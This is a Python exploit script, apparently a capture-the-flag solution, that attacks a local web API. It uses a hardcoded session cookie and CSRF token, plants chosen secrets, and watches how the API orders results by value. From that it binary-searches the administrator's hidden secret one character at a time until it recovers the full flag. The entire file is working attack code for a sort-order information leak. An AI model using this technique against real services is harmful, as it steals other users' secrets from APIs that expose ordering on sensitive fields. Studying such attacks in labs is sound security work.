import requests

session_id = "srkh1lpetl1qv1p4z3dn7i85t5tpfu5e"
csrf_token = "vbpYESlFUurRo19bB5mmUWZ3hN9Vh7nKk3lOsUEHAVB8efs90t6lsKrDZmeEo0FD"
url = "http://127.0.0.1:8000/api/secret/"
id = -1

s = requests.Session()
s.cookies["sessionid"] = session_id
s.cookies["csrftoken"] = csrf_token
s.headers["X-CSRFToken"] = csrf_token


def set_secret(secret):
    response = s.post(url, json={
        "value": secret
    }).json()
    global id
    id = response['id']


def get_position_difference():
    response = s.get(url + "?ordering=value").json()
    our_position = 0
    admin_position = 0
    i = 0
    global id
    for x in response:
        if x["id"] == 1:
            admin_position = i
        elif x["id"] == id:
            our_position = i
        i += 1
    return admin_position - our_position


def get_character(current):
    min = 32
    max = 127
    while min <= max:
        mid = (max+min)//2
        set_secret(current+chr(mid))
        print(f"trying {chr(mid)}")
        diff = get_position_difference()
        if chr(mid) == "}":
            print("diff", diff)
        if diff > 0:
            min = mid
        else:
            max = mid
        if abs(max - min) <= 1:
            set_secret(current + chr(mid) + " ")
            low = get_position_difference()
            set_secret(current + chr(mid) + "~")
            high = get_position_difference()
            print(f"{low >= high} {min} {mid} {max} {low} {high}")
            #return mid
            if low >= high:
                return min
            elif high > low:
                return max
    return max


secret = ""
char = ""
while char != "}":
    char = chr(get_character(secret))
    secret += char
    print(char)
print(secret)
